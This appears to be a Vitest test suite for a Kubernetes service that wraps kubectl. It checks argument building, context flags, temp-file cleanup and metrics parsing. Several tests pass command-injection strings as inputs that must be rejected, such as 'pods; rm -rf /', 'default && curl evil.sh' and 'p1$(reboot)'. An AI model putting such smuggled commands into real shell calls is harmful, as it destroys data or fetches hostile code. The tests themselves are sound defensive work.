import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  KubernetesService,
  parseCpuToMillicores,
  parseMemoryToMi,
  parseTopPodsOutput,
} from '../services/kubernetes/kubernetes-service';
import { resourceReadCache } from '../services/kubernetes/resource-read-cache';
import { pluginEventBus } from '../services/plugins/plugin-events';
import { safeExec } from '../utils/safe-exec';
import fs from 'fs/promises';

// Mock dependencies
vi.mock('../utils/safe-exec', () => ({
  safeExec: vi.fn(),
  ALLOWED_TOOLS: new Set(['kubectl', 'kind', 'k3d']),
}));

vi.mock('fs/promises', () => ({
  default: {
    writeFile: vi.fn().mockResolvedValue(undefined),
    unlink: vi.fn().mockResolvedValue(undefined),
  },
  writeFile: vi.fn().mockResolvedValue(undefined),
  unlink: vi.fn().mockResolvedValue(undefined),
}));

vi.mock('electron', () => ({
  app: {
    getPath: vi.fn().mockReturnValue('/mock/temp'),
  },
}));

vi.mock('../services/plugins/plugin-events', () => ({
  pluginEventBus: {
    emitResourceCreated: vi.fn(),
    emitResourceUpdated: vi.fn(),
    emitResourceDeleted: vi.fn(),
  },
}));

const mockSafeExec = vi.mocked(safeExec);

function execResolves(stdout: string) {
  mockSafeExec.mockResolvedValue({ stdout, stderr: '' });
}

/** The args array of the last safeExec('kubectl', args) call. */
function lastArgs(): string[] {
  const call = mockSafeExec.mock.calls.at(-1);
  return (call?.[1] as string[]) ?? [];
}

describe('KubernetesService', () => {
  let service: KubernetesService;

  beforeEach(() => {
    vi.clearAllMocks();
    // The read cache is a module singleton — isolate tests from each other
    resourceReadCache.clear();
    service = new KubernetesService();
  });

  describe('getResources', () => {
    it('should fetch resources using kubectl', async () => {
      const mockItems = [{ metadata: { name: 'pod-1' } }];
      execResolves(JSON.stringify({ items: mockItems }));

      const items = await service.getResources('pods', 'default');
      expect(items).toEqual(mockItems);
      expect(mockSafeExec).toHaveBeenCalledWith(
        'kubectl',
        ['get', 'pods', '-n', 'default', '-o', 'json'],
        // List reads time out so a stuck kubectl cannot pile up.
        expect.objectContaining({ timeout: 30_000 })
      );
    });

    it('should handle namespace all', async () => {
      execResolves(JSON.stringify({ items: [] }));

      await service.getResources('pods', 'all');
      expect(lastArgs()).toContain('-A');
      expect(lastArgs()).not.toContain('-n');
    });

    it('should include context flag when contextName is supplied', async () => {
      execResolves(JSON.stringify({ items: [] }));

      await service.getResources('pods', 'default', 'staging-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'staging-context'])
      );
    });

    it('should return empty array when items is missing from response', async () => {
      execResolves(JSON.stringify({}));

      const result = await service.getResources('pods', 'default');
      expect(result).toEqual([]);
    });

    it('should throw on error', async () => {
      mockSafeExec.mockRejectedValue(new Error('K8S Error'));

      await expect(service.getResources('pods', 'default')).rejects.toThrow(
        'K8S Error'
      );
    });

    it('should reject invalid resource types (injection attempt)', async () => {
      await expect(
        service.getResources('pods; rm -rf /', 'default')
      ).rejects.toThrow('Invalid resource type');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject invalid namespaces (injection attempt)', async () => {
      await expect(
        service.getResources('pods', 'default && curl evil.sh')
      ).rejects.toThrow('Invalid namespace');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject invalid context names (injection attempt)', async () => {
      await expect(
        service.getResources('pods', 'default', 'ctx `whoami`')
      ).rejects.toThrow('Invalid context name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });

  describe('createResource', () => {
    it('should create resource from manifest', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('created');

      await service.createResource(manifest);
      expect(fs.writeFile).toHaveBeenCalled();
      expect(lastArgs()[0]).toBe('apply');
      expect(lastArgs()).toContain('-f');
      expect(pluginEventBus.emitResourceCreated).toHaveBeenCalledWith(manifest);
    });

    it('should include context flag in createResource', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('created');

      await service.createResource(manifest, 'prod-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'prod-context'])
      );
    });

    it('should clean up temp file even when kubectl fails', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      mockSafeExec.mockRejectedValue(new Error('apply failed'));

      await expect(service.createResource(manifest)).rejects.toThrow(
        'apply failed'
      );
      expect(fs.unlink).toHaveBeenCalled();
    });
  });

  describe('updateResource', () => {
    it('should update resource from manifest', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('updated');

      await service.updateResource('pods', 'p1', manifest);
      expect(fs.writeFile).toHaveBeenCalled();
      expect(lastArgs()[0]).toBe('apply');
      expect(pluginEventBus.emitResourceUpdated).toHaveBeenCalledWith(manifest);
    });

    it('should include context flag in updateResource', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      execResolves('updated');

      await service.updateResource('pods', 'p1', manifest, 'dev-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'dev-context'])
      );
    });

    it('should clean up temp file even when kubectl fails', async () => {
      const manifest = { kind: 'Pod', metadata: { name: 'p1' } };
      mockSafeExec.mockRejectedValue(new Error('update failed'));

      await expect(
        service.updateResource('pods', 'p1', manifest)
      ).rejects.toThrow('update failed');
      expect(fs.unlink).toHaveBeenCalled();
    });
  });

  describe('scaleResource', () => {
    it('should scale a deployment with the expected kubectl args', async () => {
      execResolves('');

      await service.scaleResource('deployments', 'web', 'default', 3);
      expect(mockSafeExec).toHaveBeenCalledWith('kubectl', [
        'scale',
        'deployments/web',
        '--replicas=3',
        '-n',
        'default',
      ]);
      expect(pluginEventBus.emitResourceUpdated).toHaveBeenCalledWith({
        type: 'deployments',
        name: 'web',
        namespace: 'default',
        replicas: 3,
      });
    });

    it('should include context flag when contextName is supplied', async () => {
      execResolves('');

      await service.scaleResource('statefulsets', 'db', 'prod', 5, 'prod-ctx');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'prod-ctx'])
      );
    });

    it('should allow scaling to zero', async () => {
      execResolves('');

      await service.scaleResource('deployments', 'web', 'default', 0);
      expect(lastArgs()).toContain('--replicas=0');
    });

    it('should reject non-scalable resource types', async () => {
      await expect(
        service.scaleResource('pods', 'p1', 'default', 3)
      ).rejects.toThrow(/cannot be scaled/);
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject negative, fractional, and oversized replica counts', async () => {
      for (const bad of [-1, 1.5, 1001, NaN]) {
        await expect(
          service.scaleResource('deployments', 'web', 'default', bad)
        ).rejects.toThrow(/Invalid replica count/);
      }
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject invalid resource names', async () => {
      await expect(
        service.scaleResource(
          'deployments',
          'web; kubectl delete ns prod',
          'default',
          3
        )
      ).rejects.toThrow();
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });

  describe('deleteResource', () => {
    it('should delete resource', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', 'default');
      expect(lastArgs()).toEqual(['delete', 'pods', 'p1', '-n', 'default']);
      expect(pluginEventBus.emitResourceDeleted).toHaveBeenCalled();
    });

    it('should omit namespace flag when namespace is empty string', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', '');
      expect(lastArgs()).not.toContain('-n');
    });

    it('should omit namespace flag when namespace is "all"', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', 'all');
      expect(lastArgs()).not.toContain('-n');
    });

    it('should include context flag in deleteResource', async () => {
      execResolves('deleted');

      await service.deleteResource('pods', 'p1', 'default', 'prod-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'prod-context'])
      );
    });

    it('should throw on delete error', async () => {
      mockSafeExec.mockRejectedValue(new Error('delete failed'));

      await expect(
        service.deleteResource('pods', 'p1', 'default')
      ).rejects.toThrow('delete failed');
    });

    it('should reject invalid resource names (injection attempt)', async () => {
      await expect(
        service.deleteResource('pods', 'p1; kubectl delete ns prod', 'default')
      ).rejects.toThrow('Invalid resource name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });

  describe('executeCommand', () => {
    it('should execute command in pod', async () => {
      execResolves('output');

      const result = await service.executeCommand('p1', 'default', 'ls');
      expect(result).toBe('output');
      expect(lastArgs()).toEqual(['exec', 'p1', '-n', 'default', '--', 'ls']);
    });

    it('should split multi-word commands into args after --', async () => {
      execResolves('output');

      await service.executeCommand('p1', 'default', 'cat /etc/hosts');
      expect(lastArgs()).toEqual([
        'exec',
        'p1',
        '-n',
        'default',
        '--',
        'cat',
        '/etc/hosts',
      ]);
    });

    it('should include context flag when contextName is supplied', async () => {
      execResolves('output');

      await service.executeCommand('p1', 'default', 'ls', 'my-context');
      expect(lastArgs()).toEqual(
        expect.arrayContaining(['--context', 'my-context'])
      );
    });

    it('should throw on exec error', async () => {
      mockSafeExec.mockRejectedValue(new Error('exec failed'));

      await expect(
        service.executeCommand('p1', 'default', 'ls')
      ).rejects.toThrow('exec failed');
    });

    it('should reject invalid pod names (injection attempt)', async () => {
      await expect(
        service.executeCommand('p1$(reboot)', 'default', 'ls')
      ).rejects.toThrow('Invalid resource name');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });

    it('should reject empty commands', async () => {
      await expect(
        service.executeCommand('p1', 'default', '   ')
      ).rejects.toThrow('Empty command');
      expect(mockSafeExec).not.toHaveBeenCalled();
    });
  });
});

describe('pod metrics', () => {
  beforeEach(() => resourceReadCache.clear());

  it('parses cpu values', () => {
    expect(parseCpuToMillicores('250m')).toBe(250);
    expect(parseCpuToMillicores('1')).toBe(1000);
    expect(parseCpuToMillicores('1.5')).toBe(1500);
    expect(parseCpuToMillicores('garbage')).toBe(0);
  });

  it('parses memory values', () => {
    expect(parseMemoryToMi('23Mi')).toBe(23);
    expect(parseMemoryToMi('1Gi')).toBe(1024);
    expect(parseMemoryToMi('512Ki')).toBe(0.5);
    expect(parseMemoryToMi('nope')).toBe(0);
  });

  it('parses -A output with namespace column', () => {
    const out =
      'default   nginx-1   5m    23Mi\nkube-system   dns-2   12m   45Mi\n';
    expect(parseTopPodsOutput(out, 'all')).toEqual([
      { namespace: 'default', name: 'nginx-1', cpuMillicores: 5, memoryMi: 23 },
      {
        namespace: 'kube-system',
        name: 'dns-2',
        cpuMillicores: 12,
        memoryMi: 45,
      },
    ]);
  });

  it('parses single-namespace output without namespace column', () => {
    const out = 'nginx-1   5m   23Mi\n';
    expect(parseTopPodsOutput(out, 'default')).toEqual([
      { namespace: 'default', name: 'nginx-1', cpuMillicores: 5, memoryMi: 23 },
    ]);
  });

  it('getPodMetrics runs kubectl top and parses output', async () => {
    const svc = new KubernetesService();
    mockSafeExec.mockResolvedValue({
      stdout: 'default   nginx-1   5m   23Mi\n',
      stderr: '',
    });
    await expect(svc.getPodMetrics('all', 'ctx')).resolves.toEqual([
      { namespace: 'default', name: 'nginx-1', cpuMillicores: 5, memoryMi: 23 },
    ]);
    expect(lastArgs()).toEqual([
      'top',
      'pods',
      '--context',
      'ctx',
      '-A',
      '--no-headers',
    ]);
  });

  it('getPodMetrics returns [] when the metrics API is unavailable', async () => {
    const svc = new KubernetesService();
    mockSafeExec.mockRejectedValue(
      new Error('error: Metrics API not available')
    );
    await expect(svc.getPodMetrics('all', 'ctx')).resolves.toEqual([]);
  });

  it('parses a millicore value that is not a number as 0', () => {
    expect(parseCpuToMillicores('m')).toBe(0);
    expect(parseCpuToMillicores('abcm')).toBe(0);
  });

  it('parses Ti memory and rejects a number made only of dots', () => {
    expect(parseMemoryToMi('2Ti')).toBe(2 * 1024 * 1024);
    expect(parseMemoryToMi('...')).toBe(0);
    expect(parseMemoryToMi('.Mi')).toBe(0);
  });

  it('skips lines with too few columns', () => {
    expect(parseTopPodsOutput('nginx-1 5m\n', 'default')).toEqual([]);
    expect(
      parseTopPodsOutput('default nginx-1 5m\nkube-system dns 1m 2Mi\n', 'all')
    ).toEqual([
      { namespace: 'kube-system', name: 'dns', cpuMillicores: 1, memoryMi: 2 },
    ]);
  });

  it('getPodMetrics works without a context and caches per namespace', async () => {
    const svc = new KubernetesService();
    mockSafeExec.mockResolvedValue({
      stdout: 'nginx-1   5m   23Mi\n',
      stderr: '',
    });

    const first = await svc.getPodMetrics('default');
    const second = await svc.getPodMetrics('default');

    expect(first).toEqual([
      { namespace: 'default', name: 'nginx-1', cpuMillicores: 5, memoryMi: 23 },
    ]);
    expect(second).toEqual(first);
    expect(mockSafeExec).toHaveBeenCalledTimes(1);
    expect(lastArgs()).toEqual([
      'top',
      'pods',
      '-n',
      'default',
      '--no-headers',
    ]);
  });

  it('getPodMetrics rethrows failures unrelated to the metrics API', async () => {
    const svc = new KubernetesService();
    mockSafeExec.mockRejectedValue(new Error('connection refused'));

    await expect(svc.getPodMetrics('default', 'ctx')).rejects.toThrow(
      'connection refused'
    );
  });

  it('getPodMetrics validates the namespace before running kubectl', async () => {
    const svc = new KubernetesService();

    await expect(svc.getPodMetrics('bad namespace!')).rejects.toThrow();
    expect(mockSafeExec).not.toHaveBeenCalled();
  });
});

describe('scaleResource without a namespace', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    resourceReadCache.clear();
  });

  it.each(['', 'all'])('omits the namespace flag for %j', async (namespace) => {
    execResolves('');

    await new KubernetesService().scaleResource(
      'replicasets',
      'web-123',
      namespace,
      2
    );

    expect(lastArgs()).toEqual([
      'scale',
      'replicasets/web-123',
      '--replicas=2',
    ]);
  });
});
